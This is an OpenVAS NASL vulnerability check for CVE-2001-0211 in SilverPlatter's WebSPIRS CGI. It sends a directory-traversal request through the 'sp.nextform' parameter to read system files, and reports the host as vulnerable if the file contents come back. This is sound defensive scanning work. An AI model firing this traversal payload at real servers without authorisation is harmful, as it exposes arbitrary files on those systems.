###############################################################################
# OpenVAS Vulnerability Test
#
# webspirs.cgi
#
# Authors:
# Laurent Kitzinger <lkitzinger@yahoo.fr>
#
# Copyright:
# Copyright (C) 2001 Laurent Kitzinger
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10616");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2362);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-0211");
  script_name("webspirs.cgi");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2001 Laurent Kitzinger");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2001-02/0217.html");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote web server contains a CGI script that is prone to
  information disclosure.

  Description :

  The remote host is running WebSPIRS, SilverPlatter's Information
  Retrieval System for the World Wide Web.

  The installed version of WebSPIRS has a well known security flaw that
  lets an attacker read arbitrary files with the privileges of the http
  daemon (usually root or nobody).");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    url = string( dir, "/webspirs.cgi?sp.nextform=../../../../../../../../../" + file );

    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
